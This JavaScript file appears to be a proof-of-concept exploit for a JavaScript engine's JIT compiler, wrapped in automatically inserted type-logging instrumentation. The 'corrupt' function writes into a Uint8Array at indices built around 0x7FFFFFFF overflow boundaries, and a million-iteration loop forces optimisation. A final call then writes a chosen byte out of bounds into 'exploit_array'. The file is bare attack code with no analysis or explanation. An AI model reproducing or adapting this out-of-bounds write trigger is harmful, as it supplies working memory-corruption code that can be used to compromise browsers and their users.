var Inst0 = 0;
var Inst1 = 0;
var Inst2 = 0;
var Inst3 = 0;
var Inst4 = 0;
var Inst5 = 0;
var Inst6 = 0;
var Inst7 = 0;
var Inst8 = 0;
var Inst9 = 0;
var Inst10 = 0;
var Inst11 = 0;
var Inst12 = 0;
var Inst13 = 0;
var Inst14 = 0;
var Inst15 = 0;
var Inst16 = 0;
var Inst17 = 0;
var Inst18 = 0;
var Inst19 = 0;
var Inst20 = 0;
var Inst21 = 0;
var Inst22 = 0;
var Inst23 = 0;
var Inst24 = 0;
var Inst25 = 0;
var Inst26 = 0;
var Inst27 = 0;
var Inst28 = 0;
 
function _TypeOfArray(a) {
	let number = true;	
	let string = true;
	for (let i = 0; i < a.length; i++) {
		if (number && (typeof a[i]) != "number") {
			number = false;	
		}
		if (string && (typeof a[i]) != "string") {
			string = false;	
		}
		if (!number && !string)
			break;
	}
	if (number)
		return "number";
	else if (string)
		return "string";
	else
		return "any";
}

function _TypeIsEqual(t1, t2) {
	return JSON.stringify(t1) === JSON.stringify(t2);
}

function _TypeOf(a, step) {
	var t;
	var type = Object.prototype.toString.call(a).slice(8, -1).toLowerCase();	
	if (type == "array") {
		t = {type : type, extra: {elemType: _TypeOfArray(a)}};
	} else if (type == "object") {
		let shape = [];
        if (step === undefined || step > 0) {
            let keys = Object.keys(a);
            let length = Math.min(100, keys.length);
		    for (let i = 0; i < length; i++) {
			    shape.push([keys[i], _TypeOf(a[keys[i]], step === undefined ? 1 : step - 1)]);	
		    }
        }
		t = {type : type, extra: {shape: shape}};
	} else {
		t = {type : type};
	} 
	return t;
}

function _RecordType(loc, a) {
	var t = _TypeOf(a);
    print("~~~TypeInfo:" + loc + ":" + JSON.stringify(t));
}
try { if (Inst0 <= 1000 && typeof (corrupt) != "undefined") {_RecordType("<9,16,1>",(corrupt)); Inst0++; } } catch(e) {}
function corrupt(array, offset, oob_byte) {
try { if (Inst1 <= 1000 && typeof (array) != "undefined") {_RecordType("<17,22,1>",(array)); Inst1++; } } catch(e) {}try { if (Inst2 <= 1000 && typeof (offset) != "undefined") {_RecordType("<24,30,1>",(offset)); Inst2++; } } catch(e) {}try { if (Inst3 <= 1000 && typeof (oob_byte) != "undefined") {_RecordType("<32,40,1>",(oob_byte)); Inst3++; } } catch(e) {}
try { if (Inst5 <= 1000 && typeof (offset) != "undefined") {_RecordType("<71,77,2>",(offset)); Inst5++; } } catch(e) {}
  var base = -0x7FFFFFC1 + offset;
try { if (Inst4 <= 1000 && typeof (base) != "undefined") {_RecordType("<50,54,2>",(base)); Inst4++; } } catch(e) {}
  array[base - -0x80000000] = 0x4B;
try { if (Inst6 <= 1000 && typeof (array[base - -0x80000000]) != "undefined") {_RecordType("<81,106,3>",(array[base - -0x80000000])); Inst6++; } } catch(e) {}try { if (Inst7 <= 1000 && typeof (array) != "undefined") {_RecordType("<81,86,3>",(array)); Inst7++; } } catch(e) {}try { if (Inst8 <= 1000 && typeof (base) != "undefined") {_RecordType("<87,91,3>",(base)); Inst8++; } } catch(e) {}
  array[base + 0x7FFFFFE1] = 0x4B;
try { if (Inst9 <= 1000 && typeof (array[base + 0x7FFFFFE1]) != "undefined") {_RecordType("<117,141,4>",(array[base + 0x7FFFFFE1])); Inst9++; } } catch(e) {}try { if (Inst10 <= 1000 && typeof (array) != "undefined") {_RecordType("<117,122,4>",(array)); Inst10++; } } catch(e) {}try { if (Inst11 <= 1000 && typeof (base) != "undefined") {_RecordType("<123,127,4>",(base)); Inst11++; } } catch(e) {}
try { if (Inst15 <= 1000 && typeof (oob_byte) != "undefined") {_RecordType("<179,187,5>",(oob_byte)); Inst15++; } } catch(e) {}
  array[base + 0x7FFFFFC1] = oob_byte;
try { if (Inst12 <= 1000 && typeof (array[base + 0x7FFFFFC1]) != "undefined") {_RecordType("<152,176,5>",(array[base + 0x7FFFFFC1])); Inst12++; } } catch(e) {}try { if (Inst13 <= 1000 && typeof (array) != "undefined") {_RecordType("<152,157,5>",(array)); Inst13++; } } catch(e) {}try { if (Inst14 <= 1000 && typeof (base) != "undefined") {_RecordType("<158,162,5>",(base)); Inst14++; } } catch(e) {}
}

try { if (Inst16 <= 1000 && typeof (trigger_optimize) != "undefined") {_RecordType("<201,217,8>",(trigger_optimize)); Inst16++; } } catch(e) {}
function trigger_optimize() {
try { if (Inst18 <= 1000 && typeof (Uint8Array) != "undefined") {_RecordType("<240,250,9>",(Uint8Array)); Inst18++; } } catch(e) {}
  var array = new Uint8Array(0x40);
try { if (Inst17 <= 1000 && typeof (array) != "undefined") {_RecordType("<228,233,9>",(array)); Inst17++; } } catch(e) {}

  for (var i = 0; i < 1000000; i++) {
try { if (Inst19 <= 1000 && typeof (i) != "undefined") {_RecordType("<270,271,11>",(i)); Inst19++; } } catch(e) {}try { if (Inst20 <= 1000 && typeof (i) != "undefined") {_RecordType("<277,278,11>",(i)); Inst20++; } } catch(e) {}try { if (Inst21 <= 1000 && typeof (i) != "undefined") {_RecordType("<290,291,11>",(i)); Inst21++; } } catch(e) {}
try { if (Inst22 <= 1000 && typeof (corrupt) != "undefined") {_RecordType("<301,308,12>",(corrupt)); Inst22++; } } catch(e) {}try { if (Inst23 <= 1000 && typeof (array) != "undefined") {_RecordType("<309,314,12>",(array)); Inst23++; } } catch(e) {}
    corrupt(array, 0, 0x00);
  }
}

try { if (Inst24 <= 1000 && typeof (trigger_optimize) != "undefined") {_RecordType("<333,349,16>",(trigger_optimize)); Inst24++; } } catch(e) {}
trigger_optimize();
try { if (Inst26 <= 1000 && typeof (Uint8Array) != "undefined") {_RecordType("<377,387,17>",(Uint8Array)); Inst26++; } } catch(e) {}
var exploit_array = new Uint8Array(0x40);
try { if (Inst25 <= 1000 && typeof (exploit_array) != "undefined") {_RecordType("<357,370,17>",(exploit_array)); Inst25++; } } catch(e) {}
try { if (Inst27 <= 1000 && typeof (corrupt) != "undefined") {_RecordType("<395,402,18>",(corrupt)); Inst27++; } } catch(e) {}try { if (Inst28 <= 1000 && typeof (exploit_array) != "undefined") {_RecordType("<403,416,18>",(exploit_array)); Inst28++; } } catch(e) {}
corrupt(exploit_array, -2, 0x80);

